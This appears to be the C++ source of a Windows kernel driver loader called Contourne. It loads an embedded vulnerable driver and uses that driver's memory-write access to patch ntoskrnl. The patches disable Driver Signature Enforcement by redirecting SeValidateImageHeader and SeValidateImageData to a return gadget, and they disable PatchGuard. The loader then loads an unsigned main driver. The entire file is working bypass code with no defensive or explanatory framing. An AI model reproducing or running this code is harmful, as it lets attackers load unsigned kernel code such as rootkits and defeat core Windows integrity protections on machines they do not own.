#include "Contourne.h"
#include "Load.h"
#include "driver_data.h"
#include "SkCrypt.h"

#include <iostream>
#include <windows.h>
#include <ntstatus.h>
#include <DbgHelp.h>
#pragma comment(lib, "Dbghelp.lib")
#include <random>
#include <strsafe.h>
#include <guiddef.h>

namespace Contourne
{

    char SeValidateImageDataOG[8];
    char SeValidateImageHeaderOG[8];


    ULONG64 SeValidateImageDataOffset;
    ULONG64 SeValidateImageHeaderOffset;
    ULONG64 RetOffset;
    ULONG64 NtoskrnlBaseAddress;
    ULONG64 PatchgaurdValueOffset;
    ULONG64 PatchgaurdOffset;
    HANDLE  VulnurableDriverHandle;

    bool init()
    {
        auto ntoskrnl_base = KernelUtils::get_ntoskrnl_base();
        auto se_validate_image_data_offset = KernelUtils::get_se_validate_image_data_offset();
        auto se_validate_image_header_offset = KernelUtils::get_se_validate_image_header_offset();
        auto return_offset = KernelUtils::get_return_offset();
        auto patch_gaurd_value_offset = KernelUtils::get_patch_gaurd_value_offset();
        auto patch_gaurd_offset = KernelUtils::get_patch_gaurd_offset();
        if (!ntoskrnl_base.has_value() ||
            !se_validate_image_data_offset.has_value() ||
            !se_validate_image_header_offset.has_value() ||
            !return_offset.has_value() ||
            !patch_gaurd_value_offset.has_value() ||
            !patch_gaurd_offset.has_value())
        {
            std::cerr <<  (" [ERROR] One or more offsets are invalid.\n");
            return false;
        }
        NtoskrnlBaseAddress = ntoskrnl_base.value();
        SeValidateImageDataOffset = se_validate_image_data_offset.value();
        SeValidateImageHeaderOffset = se_validate_image_header_offset.value();
        RetOffset = return_offset.value();
        PatchgaurdValueOffset = patch_gaurd_value_offset.value();
        PatchgaurdOffset = patch_gaurd_offset.value();

        return true;
    }

    bool disable_dse()
    {
        ULONG64 return_address_offset = NtoskrnlBaseAddress + RetOffset;
        if (!Secure::WriteVirtualMemory(VulnurableDriverHandle, NtoskrnlBaseAddress + SeValidateImageHeaderOffset, &return_address_offset, sizeof(return_address_offset)))
        {
            std::cerr <<  (" [ERROR] Failed to patch Header Offset. Error code: ") << GetLastError() <<  ("\n");
            return false;
        }
        if (!Secure::WriteVirtualMemory(VulnurableDriverHandle, NtoskrnlBaseAddress + SeValidateImageDataOffset, &return_address_offset, sizeof(return_address_offset)))
        {
            std::cerr <<  (" [ERROR] Failed to patch Data Offset. Error code: ") << GetLastError() <<  ("\n");
            return false;
        }
        return true;
    }

    bool disable_pg()
    {
        ULONG64 return_address_offset = NtoskrnlBaseAddress + RetOffset;
        ULONG64 patch_gaurd_value_address = NtoskrnlBaseAddress + PatchgaurdValueOffset;
        if (!Secure::WriteVirtualMemory(VulnurableDriverHandle, NtoskrnlBaseAddress + PatchgaurdOffset, &patch_gaurd_value_address, 8))
        {
            std::cerr <<  (" [ERROR] Failed to disable PG. Error code : ") << GetLastError() << std::endl;
            return false;
        }
        return true;
    }

    bool load_vuld(const std::uint8_t* pdfw_krnl_bytes, size_t pdfw_krnl_size, const std::string& pdfw_krnl_service_name)
    {
        auto [load_status, service_name] = driver::load(pdfw_krnl_bytes, pdfw_krnl_size, pdfw_krnl_service_name);
        if (!NT_SUCCESS(load_status))
        {
            std::cerr <<  (" [ERROR] Failed to load vuld.\n");
            return false;
        }
        VulnurableDriverHandle = CreateFileA((LPCSTR)("\\\\.\\" + service_name).c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (VulnurableDriverHandle == INVALID_HANDLE_VALUE || !VulnurableDriverHandle)
        {
            std::cerr <<  (" [ERROR] Failed to get a valid handle to the device driver. Error Code: ") << GetLastError() <<  ("\n");
            driver::unload(service_name);
            return false;
        }
        return true;
    }


    Status load_driver(const std::string& driver_service_name,
        const std::string& pdfw_krnl_service_name)
    {
        if (!load_vuld(k_pdfw_krnl_bytes, k_pdfw_krnl_size, pdfw_krnl_service_name))
        {
            std::cerr <<  (" [ERROR] Failed loading vuld.\n");
            return Status::FAILED_LOADING_VULN;
        }
        if (!disable_pg())
        {
            std::cerr <<  (" [ERROR] Failed disabling PG.\n");
            driver::unload(pdfw_krnl_service_name);
            return Status::FAILED_DISABLE_PG;
        }
        if (!disable_dse())
        {
            std::cerr <<  (" [ERROR] Failed disabling DSE.\n");
            driver::unload(pdfw_krnl_service_name);
            return Status::FAILED_DISABLED_SE;
        }

        auto [load_status, service_name] = driver::load(k_driver_bytes, k_driver_size, driver_service_name);

        if (!NT_SUCCESS(load_status))
        {
            if (load_status == STATUS_IMAGE_ALREADY_LOADED)
            {
                if (!driver::unload(driver_service_name))
                {
                    driver::unload(pdfw_krnl_service_name);
                    return Status::FAILED_LOADING_DRV;
                }

                std::tie(load_status, service_name) = driver::load(k_driver_bytes, k_driver_size, driver_service_name);
                if (!NT_SUCCESS(load_status))
                {
                    std::cerr <<  (" [ERROR] Failed loading main driver after unload attempt, exiting.\n");
                    driver::unload(pdfw_krnl_service_name);
                    return Status::FAILED_LOADING_DRV;
                }
            }
            else
            {
                std::cerr <<  (" [ERROR] Failed loading main driver on the first attempt , exiting.\n");
                driver::unload(pdfw_krnl_service_name);
                return Status::FAILED_LOADING_DRV;
            }
        }

        driver::unload(pdfw_krnl_service_name);

        return Status::SUCCESS;
    }

    std::string status_to_string(Status status)
    {
        switch (status)
        {
        case Status::FAILED_LOADING_VULN:
            return  ("Failed loading Vuld");
        case Status::FAILED_DISABLE_PG:
            return  ("Failed Disabling PG");
        case Status::FAILED_DISABLED_SE:
            return  ("Failed Disabling DSE");
        case Status::FAILED_LOADING_DRV:
            return  ("Failed Loading Main Driver");
        case Status::SUCCESS:
            return  ("Success");
        default:
            return  ("Unknown Status, assuming success");
        }
    }
}